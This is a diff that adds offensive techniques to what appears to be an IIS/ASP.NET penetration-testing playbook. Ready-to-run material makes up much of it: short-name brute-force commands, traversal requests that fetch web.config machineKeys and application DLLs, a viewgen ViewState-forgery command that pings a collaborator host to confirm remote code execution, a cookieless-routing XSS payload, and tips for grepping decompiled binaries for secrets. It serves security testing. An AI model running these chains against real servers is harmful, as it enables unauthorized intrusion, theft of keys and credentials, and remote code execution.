@@ -156,3 +156,70 @@ Range: bytes=0-18446744073709551615
 - `nuclei -t iis/` templates
 - `nikto` for common misconfigurations
 - Burp Suite for manual testing
+
+
+## Additional Techniques — ported from WebSkills (websockets-iis-test)
+
+### HTTPAPI 2.0 404 → Cert CN → VHost Hopping
+
+A bare `HTTPAPI/2.0` 404 (kernel HTTP.sys default) means no site matched the `Host` header — it is not a dead end:
+1. Read the TLS certificate CN/SAN of the IP → real hostname (e.g., `apply.company.com`).
+2. Set `Host:` to that name → the app appears.
+3. Enumerate other virtual hosts on the same IP with `ffuf`/Burp Intruder fuzzing the `Host:` header → reach forgotten/internal sites (e.g., `mssql.company.com`, `admin.company.com`).
+
+### Additional Fingerprint Signals
+
+- Cookies: `.ASPXAUTH`, `__RequestVerificationToken` (alongside `ASP.NET_SessionId`).
+- HTML: `__EVENTVALIDATION`, `__EVENTTARGET`, `__VIEWSTATEGENERATOR` hidden inputs.
+- Cookieless session/routing segments in the path: `(S(...))` and `(A(...))`.
+- `.axd` handlers (`WebResource.axd`, `ScriptResource.axd`) confirm ASP.NET (padding-oracle history on `ScriptResource.axd` `d=`).
+- Shodan: `http.title:"IIS"`, `ssl.cert.subject.CN:"company.in" http.title:"IIS"`.
+
+### Short-Name Pipeline: shortscan → crunch → ffuf
+
+8.3 tilde enum only leaks the first ~6 chars + 3-char extension; recover the rest:
+```bash
+shortscan https://apply.company.com/                       # get partial names (e.g. LIDSDI)
+./crunch 0 3 abcdefghijklmnopqrstuvwxyz0123456789 -o 3char.txt
+ffuf -w 3char.txt -D -e asp,aspx,ashx,asmx,wsdl,wadl,xml,zip,txt -t 100 -c \
+  -u https://apply.company.com/lidsFUZZ
+nuclei -u https://target -t fuzzing/iis-shortname.yaml
+```
+Always brute `.zip`/`.txt`/`.bak` — leaked backups/DLL archives are where source and secrets fall out.
+
+### LFD Chain: web.config → machineKey → ViewState RCE
+
+A file-download/traversal primitive on an IIS app is the gateway to RCE:
+```
+DownloadCategoryExcel?fileName=../../web.config      → <machineKey validationKey= decryptionKey=>
+DownloadCategoryExcel?fileName=../../global.asax     → learn DLL names (<add namespace="Company.Web.Api.dll"/>)
+DownloadCategoryExcel?fileName=../../bin/Company.Web.Api.dll  → download binary → decompile
+```
+Then forge a malicious `__VIEWSTATE`:
+- If **ViewState MAC is disabled** → forge with no key needed.
+- If MAC enabled but you hold the `validationKey` (+`decryptionKey` when encrypted) → forge a MAC-valid payload carrying a deserialization gadget → RCE.
+```bash
+viewgen --webconfig web.config -m <__VIEWSTATEGENERATOR> -c "ping <collaborator>"
+# ysoserial.net (ViewState plugin) is the canonical gadget companion
+```
+Grab the **whole `<machineKey>` element verbatim** (both keys + algs). ASP.NET Core does not use ViewState.
+
+### DLL Decompilation
+
+Leaked `.dll`/`.exe` (often inside `.zip` backups) decompile near-to-source with **dnSpy** (decompile + debug), **dotPeek**, or **ILSpy**. Grep output for `machineKey`, `validationKey`, `decryptionKey`, `connectionString`, `ApiKey`, `secret`, `Bearer`, internal hostnames, and `[Route(...)]` maps → feed machineKeys straight into viewgen.
+
+### ASP.NET Cookieless-Routing XSS
+
+`(A(...))`/`(S(...))` segments are parsed as cookieless auth/session tokens and stripped during canonicalization, but the reflected value can survive unencoded (image bases like `~/images/`, redirects, `returnUrl`, self-post `action`):
+```
+/(A(%22onerror='alert%60123%60'test))/
+```
+Test on login pages, redirects, and dynamic URL construction; vary encoding (`%2522`, mixed case) if filtered.
+
+### Extensions to Brute
+
+`.aspx .ashx .asmx .wsdl .wadl .axd .xml .zip .txt .bak` — the `.wsdl`/`.asmx` hits expose web services; `.zip`/`.bak` expose source/backups.
+
+### False-Positive Guards
+
+`web.config` returning 404 is IIS's default static-file block, not disclosure — confirm actual `<configuration>` XML is returned. `__VIEWSTATE` present ≠ RCE — confirm MAC disabled or machineKey known. DLL "leak" must be a valid PE (`MZ` header) that decompiles.
